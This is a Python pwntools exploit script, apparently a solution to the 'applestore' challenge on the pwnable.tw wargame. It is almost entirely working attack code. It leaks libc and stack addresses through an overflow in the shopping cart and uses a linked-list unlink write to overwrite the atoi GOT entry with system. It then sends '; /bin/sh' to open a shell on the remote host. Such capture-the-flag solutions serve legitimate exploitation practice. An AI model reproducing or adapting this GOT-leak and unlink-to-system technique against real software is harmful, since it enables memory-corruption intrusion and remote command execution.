from pwn import *

BEDUG = False

if BEDUG==True:
	io = process('./applestore')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	io = remote('chall.pwnable.tw', 10104)
	libc = ELF('./libc_32.so.6')

elf = ELF('./applestore')
#context.terminal = ['tmux']

def add(product):
	print(io.recvuntil(b'> '))
	io.sendline(b'2')
	print(io.recvuntil(b'> '))
	io.sendline(str(product))

def checkout():
	print(io.recvuntil(b'> '))
	io.sendline(b'5')
	print(io.recvuntil(b'> '))
	io.sendline(b'y')

def cart(payload):
	print(io.recvuntil(b'> '))
	io.sendline(b'4')
	print(io.recvuntil(b'> '))
	io.sendline(payload)

def delete(product):
	print(io.recvuntil(b'> '))
	io.sendline(b'3')
	print(io.recvuntil(b'> '))
	io.sendline(str(product))

'''
for i in range(36):
	for j in range(36):
		for k in range(36):
			for l in range(36):
				for m in range(36):
					a = i*0xc7 + j*0x12b + k*0x1f3 + l*0x18f + m*0xc7
					if (a == 7174):
						print('prod 1:', i)
						print('prod 2:', j)
						print('prod 3:', k)
						print('prod 4:', l)
						print('prod 5:', m)
						print('total: ', a)
						pause()
'''


for i in range(10):
	add(4)
for j in range(16):
	add(5)

#pause()

checkout()

payload = b'yy'+p32(elf.got['puts'])+p32(0) * 3

cart(payload)

print(io.recvuntil('\n27: '))
libc.address = u32(io.recv(4)) - libc.sym['puts']

payload = b'yy'+p32(libc.sym['environ'])+p32(0) * 3
cart(payload)
print(io.recvuntil('\n27: '))
stack = u32(io.recv(4)) - 0x124
ebp = stack + 0x20
#fd = stack + 0x4 - 0xc
#bk = elf.got['atoi'] - 0x8

bk = ebp - 0x8
fd = elf.got['atoi'] + 0x22

payload = b'27'
payload += p32(stack+0x78)
payload += p32(libc.sym['system'])
payload += p32(fd)
payload += p32(bk)

payload = payload.decode('ISO-8859-1')
#cart(payload)
delete(payload)
print(io.recvuntil(b'> '))
payload = p32(libc.sym['system']) + b'; /bin/sh'
io.sendline(payload)
io.interactive()